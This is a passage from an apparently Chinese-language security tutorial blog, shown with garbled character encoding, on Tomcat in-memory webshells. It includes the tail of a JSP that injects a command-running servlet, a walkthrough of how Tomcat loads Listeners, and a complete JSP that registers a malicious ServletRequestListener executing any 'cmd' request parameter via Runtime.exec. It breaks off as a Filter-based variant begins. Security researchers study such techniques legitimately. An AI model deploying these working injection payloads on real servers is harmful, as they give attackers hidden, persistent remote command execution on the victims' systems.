class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">        wrapper.setName(servletName);</span><br><span class="line">        wrapper.setServlet(servlet);</span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line">        standardContext.addServletMappingDecoded(servletURL, servletName);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletURL + <span class="string">&quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletName + <span class="string">&quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/zhandian1&quot;</span> + servletURL + <span class="string">&quot;?cmd=echo ä¸–ç•Œï¼Œä½ å¥½ï¼&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> e.getMessage();</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">outError</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        outError.println(<span class="string">&quot;Error: &quot;</span> + errorMessage);</span><br><span class="line">        outError.flush();</span><br><span class="line">        outError.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characters</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">randomString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * characters.length());</span><br><span class="line">            randomString.append(characters.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907013038570.png" alt="image-20250907013038570"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907013100789.png" alt="image-20250907013100789"></p><h2 id="Listenerç®€å•ä»‹ç»"><a href="#Listenerç®€å•ä»‹ç»" class="headerlink" title="Listenerç®€å•ä»‹ç»"></a>Listenerç®€å•ä»‹ç»</h2><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/tomcat.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/tomcat.png" alt="img"></a></p><p>ç”±ä¸Šå›¾å¯çŸ¥ï¼Œ<code>Listener</code>æ˜¯æœ€å…ˆè¢«åŠ è½½çš„ï¼Œæ‰€ä»¥æ ¹æ®å‰é¢æˆ‘ä»¬å­¦åˆ°çš„æ€è·¯ï¼Œæˆ‘åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ¶æ„çš„<code>Listener</code>ï¼Œå°±åˆå¯ä»¥å½¢æˆä¸€ç§å†…å­˜é©¬äº†ã€‚</p><p>åœ¨<code>tomcat</code>ä¸­ï¼Œå¸¸è§çš„<code>Listener</code>æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li><code>ServletContextListener</code>ï¼Œç”¨æ¥ç›‘å¬æ•´ä¸ª<code>Web</code>åº”ç”¨ç¨‹åºçš„å¯åŠ¨å’Œå…³é—­äº‹ä»¶ï¼Œéœ€è¦å®ç°<code>contextInitialized</code>å’Œ<code>contextDestroyed</code>è¿™ä¸¤ä¸ªæ–¹æ³•ï¼›</li><li><code>ServletRequestListener</code>ï¼Œç”¨æ¥ç›‘å¬<code>HTTP</code>è¯·æ±‚çš„åˆ›å»ºå’Œé”€æ¯äº‹ä»¶ï¼Œéœ€è¦å®ç°<code>requestInitialized</code>å’Œ<code>requestDestroyed</code>è¿™ä¸¤ä¸ªæ–¹æ³•ï¼›</li><li><code>HttpSessionListener</code>ï¼Œç”¨æ¥ç›‘å¬<code>HTTP</code>ä¼šè¯çš„åˆ›å»ºå’Œé”€æ¯äº‹ä»¶ï¼Œéœ€è¦å®ç°<code>sessionCreated</code>å’Œ<code>sessionDestroyed</code>è¿™ä¸¤ä¸ªæ–¹æ³•ï¼›</li><li><code>HttpSessionAttributeListener</code>ï¼Œç›‘å¬<code>HTTP</code>ä¼šè¯å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢äº‹ä»¶ï¼Œéœ€è¦å®ç°<code>attributeAdded</code>ã€<code>attributeRemoved</code>å’Œ<code>attributeReplaced</code>è¿™ä¸‰ä¸ªæ–¹æ³•ã€‚</li></ul><p>å¾ˆæ˜æ˜¾ï¼Œ<code>ServletRequestListener</code>æ˜¯æœ€é€‚åˆåšå†…å­˜é©¬çš„ï¼Œå› ä¸ºå®ƒåªè¦è®¿é—®æœåŠ¡å°±èƒ½è§¦å‘æ“ä½œã€‚</p><h2 id="ç¼–å†™ä¸€ä¸ªç®€å•çš„Listenerï¼ˆServletRequestListenerï¼‰"><a href="#ç¼–å†™ä¸€ä¸ªç®€å•çš„Listenerï¼ˆServletRequestListenerï¼‰" class="headerlink" title="ç¼–å†™ä¸€ä¸ªç®€å•çš„Listenerï¼ˆServletRequestListenerï¼‰"></a>ç¼–å†™ä¸€ä¸ªç®€å•çš„Listenerï¼ˆServletRequestListenerï¼‰</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] initial TestListener&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907105544952.png" alt="image-20250907105544952"></p><h2 id="ä»ä»£ç å±‚é¢åˆ†æListenerè¿è¡Œçš„æ•´ä½“æµç¨‹"><a href="#ä»ä»£ç å±‚é¢åˆ†æListenerè¿è¡Œçš„æ•´ä½“æµç¨‹" class="headerlink" title="ä»ä»£ç å±‚é¢åˆ†æListenerè¿è¡Œçš„æ•´ä½“æµç¨‹"></a>ä»ä»£ç å±‚é¢åˆ†æListenerè¿è¡Œçš„æ•´ä½“æµç¨‹</h2><p>æ–­ç‚¹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907105701074.png" alt="image-20250907105701074"></p><p>å¾€ä¸‹ç¿»å¯ä»¥çœ‹åˆ°<code>org.apache.catalina.core.StandardContext#listenerStart</code>æ–¹æ³•çš„è°ƒç”¨ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907110521029.png" alt="image-20250907110521029"></p><p>å¼€å¯è°ƒè¯•è§¦å‘æ–­ç‚¹ï¼Œæ ¹æ®å †æ ˆå›æº¯æ‰¾åˆ°StandardContext.listenerStart()æ–¹æ³•ï¼Œè¿™é‡Œè¦ç‚¹è¿›å»æœä¸€ä¸‹å°±å¯ä»¥æœåˆ°äº†ï¼Œå¯ä»¥çœ‹åˆ°å®ƒå…ˆè°ƒç”¨findApplicationListeners()è·å–Listenerçš„åå­—ï¼Œç„¶åå®ä¾‹åŒ–:<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907110643823.png" alt="image-20250907110643823"></p><p>åˆ†ç±»æ‘†æ”¾å®Œäº†ä¹‹åï¼Œå¹²è¿™æ ·ä¸€ä»¶äº‹æƒ…ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));</span><br></pre></td></tr></table></figure><p><code>Arrays.asList(...)</code> å¥½ç†è§£ï¼Œæ„æ€å°±æ˜¯å°†æ•°ç»„è½¬æ¢ä¸ºåˆ—è¡¨ï¼›<code>eventListeners.addAll(...)</code>ä¹Ÿå¥½ç†è§£ï¼Œæ„æ€å°±æ˜¯å°†æ‹¬å·é‡Œé¢çš„å†…å®¹æ·»åŠ åˆ°ä¹‹å‰å®ä¾‹åŒ–çš„ç›‘å¬å™¨åˆ—è¡¨ <code>eventListeners</code> ä¸­ã€‚å…³äºæ‹¬å·é‡Œè¾¹çš„<code>org.apache.catalina.core.StandardContext#getApplicationEventListeners</code>è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬ç‚¹è¿›å»çœ‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> applicationEventListenersList.toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¾ˆç®€å•æ˜äº†ï¼Œå°±æ˜¯æŠŠ<code>applicationEventListenersList</code>è½¬æ¢æˆä¸€ä¸ªåŒ…å«ä»»æ„ç±»å‹å¯¹è±¡çš„æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå¯èƒ½åŒ…å«å„ç§ç±»å‹çš„åº”ç”¨ç¨‹åºäº‹ä»¶ç›‘å¬å™¨çš„æ•°ç»„ã€‚</p><p>é‚£è¿™æ€»ç»“èµ·æ¥å°±ä¸€å¥è¯ï¼Œå°±æ˜¯<code>Listener</code>æœ‰ä¸¤ä¸ªæ¥æºï¼Œä¸€æ˜¯æ ¹æ®<code>web.xml</code>æ–‡ä»¶æˆ–è€…<code>@WebListener</code>æ³¨è§£å®ä¾‹åŒ–å¾—åˆ°çš„<code>Listener</code>ï¼›äºŒæ˜¯<code>applicationEventListenersList</code>ä¸­çš„<code>Listener</code>ã€‚å‰é¢çš„æˆ‘ä»¬è‚¯å®šæ²¡æ³•æ§åˆ¶ï¼Œå› ä¸ºè¿™æ˜¯ç»™å¼€å‘è€…ç”¨çš„ï¼Œä¸æ˜¯ç»™é»‘å®¢ç”¨çš„å“ˆå“ˆå“ˆã€‚é‚£å°±æ‰¾æ‰¾çœ‹ï¼Œæœ‰æ²¡æœ‰ç±»ä¼¼ä¹‹å‰æˆ‘ä»¬ç”¨åˆ°çš„<code>addFilterConfig</code>è¿™ç§å‡½æ•°å‘¢ï¼Ÿå½“ç„¶æ˜¯æœ‰çš„ï¼Œ<code>ctrl+å·¦é”®</code>å¾€ä¸Šæ‰¾ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907110941521.png" alt="image-20250907110941521"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907111026990.png" alt="image-20250907111026990"></p><p>æ–¹æ³•åå­—å«åš<code>addApplicationEventListener</code>ï¼Œåœ¨<code>StandardContext.java</code>é‡Œé¢ï¼Œä»£ç å¦‚ä¸‹ï¼Œå®Œç¾ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚ï¼ŒçœŸæ˜¯å¤ªå“‡å¡äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">    applicationEventListenersList.add(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Listenerå†…å­˜é©¬å®ç°"><a href="#Listenerå†…å­˜é©¬å®ç°" class="headerlink" title="Listenerå†…å­˜é©¬å®ç°"></a>Listenerå†…å­˜é©¬å®ç°</h2><p>æ ¹æ®ä¸Šé¢çš„åˆ†ææˆ‘ä»¬çŸ¥é“Listeneræ¥æºäºtomcatåˆå§‹åŒ–æ—¶ä»web.xmlå®ä¾‹åŒ–çš„Listenerå’ŒapplicationEventListenersListä¸­çš„Listenerï¼Œå‰è€…æˆ‘ä»¬æ— æ³•æ§åˆ¶ï¼Œä½†æ˜¯åè€…æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œåªéœ€è¦å¾€applicationEventListenersListä¸­åŠ å…¥æˆ‘ä»¬çš„æ¶æ„Listenerå³å¯ã€‚å®é™…ä¸ŠStandardContextå­˜åœ¨addApplicationEventListener()æ–¹æ³•å¯ä»¥ç›´æ¥ç»™æˆ‘ä»¬è°ƒç”¨ï¼Œå¾€applicationEventListenersListä¸­åŠ å…¥Listenerã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬çš„Listenerå†…å­˜é©¬å®ç°æ­¥éª¤:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„Listener</span><br><span class="line">2.è·å–StandardContext</span><br><span class="line">3.è°ƒç”¨StandardContext.addApplicationEventListener()æ·»åŠ æ¶æ„Listener </span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ä»£ç çš„å…·ä½“å®ç°:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletServletRequestListenerRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequestEvent.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="type">S</span> <span class="variable">servletRequestListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="Filterå®¹å™¨ä¸FilterDefsã€FilterConfigsã€FilterMapsã€FilterChain"><a href="#Filterå®¹å™¨ä¸FilterDefsã€FilterConfigsã€FilterMapsã€FilterChain" class="headerlink" title="Filterå®¹å™¨ä¸FilterDefsã€FilterConfigsã€FilterMapsã€FilterChain"></a>Filterå®¹å™¨ä¸FilterDefsã€FilterConfigsã€FilterMapsã€FilterChain</h2><p>å¼€å¤´å…ˆæ˜ç¡®ä¸€ç‚¹ï¼Œå°±æ˜¯<code>Filter</code>å®¹å™¨æ˜¯ç”¨äºå¯¹è¯·æ±‚å’Œå“åº”è¿›è¡Œè¿‡æ»¤å’Œå¤„ç†çš„ï¼Œä»¥ä¸‹è¿™å¼ å›¾æ˜¯æ ¹æ®<code>Skay</code>å¸ˆå‚…æ–‡ç« ä¸­çš„å›¾ç‰‡é‡åˆ¶çš„ï¼š</p><blockquote><p><a href="https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g">https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g</a></p></blockquote><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/filter-demo.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/filter-demo.png" alt="img"></a></p><p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ª<code>filter</code>å°±æ˜¯ä¸€ä¸ªå…³å¡ï¼Œå®¢æˆ·ç«¯çš„è¯·æ±‚åœ¨ç»è¿‡<code>filter</code>ä¹‹åæ‰ä¼šåˆ°<code>Servlet</code>ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬åŠ¨æ€åˆ›å»ºä¸€ä¸ª<code>filter</code>å¹¶ä¸”å°†å…¶æ”¾åœ¨æœ€å‰é¢ï¼Œæˆ‘ä»¬çš„<code>filter</code>å°±ä¼šæœ€å…ˆæ‰§è¡Œï¼Œå½“æˆ‘ä»¬åœ¨<code>filter</code>ä¸­æ·»åŠ æ¶æ„ä»£ç ï¼Œå°±å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œï¼Œå½¢æˆå†…å­˜é©¬ã€‚</p><p>è¿™äº›åè¯å…¶å®å¾ˆå®¹æ˜“ç†è§£ï¼Œé¦–å…ˆï¼Œéœ€è¦å®šä¹‰è¿‡æ»¤å™¨<code>FilterDef</code>ï¼Œå­˜æ”¾è¿™äº›<code>FilterDef</code>çš„æ•°ç»„è¢«ç§°ä¸º<code>FilterDefs</code>ï¼Œæ¯ä¸ª<code>FilterDef</code>å®šä¹‰äº†ä¸€ä¸ªå…·ä½“çš„è¿‡æ»¤å™¨ï¼ŒåŒ…æ‹¬æè¿°ä¿¡æ¯ã€åç§°ã€è¿‡æ»¤å™¨å®ä¾‹ä»¥åŠ<code>class</code>ç­‰ï¼Œè¿™ä¸€ç‚¹å¯ä»¥ä»<code>org/apache/tomcat/util/descriptor/web/FilterDef.java</code>çš„ä»£ç ä¸­çœ‹å‡ºæ¥ï¼›ç„¶åæ˜¯<code>FilterDefs</code>ï¼Œå®ƒåªæ˜¯è¿‡æ»¤å™¨çš„æŠ½è±¡å®šä¹‰ï¼Œè€Œ<code>FilterConfigs</code>åˆ™æ˜¯è¿™äº›è¿‡æ»¤å™¨çš„å…·ä½“é…ç½®å®ä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ¯ä¸ªè¿‡æ»¤å™¨å®šä¹‰å…·ä½“çš„é…ç½®å‚æ•°ï¼Œä»¥æ»¡è¶³ç³»ç»Ÿçš„éœ€æ±‚ï¼›ç´§æ¥ç€æ˜¯<code>FilterMaps</code>ï¼Œå®ƒæ˜¯ç”¨äºå°†<code>FilterConfigs</code>æ˜ å°„åˆ°å…·ä½“çš„è¯·æ±‚è·¯å¾„æˆ–å…¶ä»–æ ‡è¯†ä¸Šï¼Œè¿™æ ·ç³»ç»Ÿåœ¨å¤„ç†è¯·æ±‚æ—¶å°±èƒ½å¤Ÿæ ¹æ®è¯·æ±‚çš„è·¯å¾„æˆ–æ ‡è¯†æ‰¾åˆ°å¯¹åº”çš„<code>FilterConfigs</code>ï¼Œä»è€Œç¡®å®šè¦æ‰§è¡Œçš„è¿‡æ»¤å™¨é“¾ï¼›è€Œ<code>FilterChain</code>æ˜¯ç”±å¤šä¸ª<code>FilterConfigs</code>ç»„æˆçš„é“¾å¼ç»“æ„ï¼Œå®ƒå®šä¹‰äº†è¿‡æ»¤å™¨çš„æ‰§è¡Œé¡ºåºï¼Œåœ¨å¤„ç†è¯·æ±‚æ—¶ç³»ç»Ÿä¼šæŒ‰ç…§<code>FilterChain</code>ä¸­çš„é¡ºåºä¾æ¬¡æ‰§è¡Œæ¯ä¸ªè¿‡æ»¤å™¨ï¼Œå¯¹è¯·æ±‚è¿›è¡Œè¿‡æ»¤å’Œå¤„ç†ã€‚</p><h2 id="ç¼–å†™ä¸€ä¸ªç®€å•çš„Filter"><a href="#ç¼–å†™ä¸€ä¸ªç®€å•çš„Filter" class="headerlink" title="ç¼–å†™ä¸€ä¸ªç®€å•çš„Filter"></a>ç¼–å†™ä¸€ä¸ªç®€å•çš„Filter</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filteråˆå§‹åŒ–åˆ›å»º&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filteræ‰§è¡Œè¿‡æ»¤æ“ä½œ&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filterå·²é”€æ¯&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·‘èµ·æ¥ä¹‹åï¼Œæ§åˆ¶å°è¾“å‡º<code>[*] Filteråˆå§‹åŒ–åˆ›å»º</code>ï¼Œå½“æˆ‘ä»¬è®¿é—®<code>/test</code>è·¯ç”±çš„æ—¶å€™ï¼Œæ§åˆ¶å°ç»§ç»­è¾“å‡º<code>[*] Filteræ‰§è¡Œè¿‡æ»¤æ“ä½œ</code>ï¼Œå½“æˆ‘ä»¬ç»“æŸ<code>tomcat</code>çš„æ—¶å€™ï¼Œä¼šè§¦å‘<code>destroy</code>æ–¹æ³•ï¼Œä»è€Œè¾“å‡º<code>[*] Filterå·²é”€æ¯</code>ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907152518018.png" alt="image-20250907152518018"></p><h2 id="ä»ä»£ç å±‚é¢åˆ†æFilterè¿è¡Œçš„æ•´ä½“æµç¨‹"><a href="#ä»ä»£ç å±‚é¢åˆ†æFilterè¿è¡Œçš„æ•´ä½“æµç¨‹" class="headerlink" title="ä»ä»£ç å±‚é¢åˆ†æFilterè¿è¡Œçš„æ•´ä½“æµç¨‹"></a>ä»ä»£ç 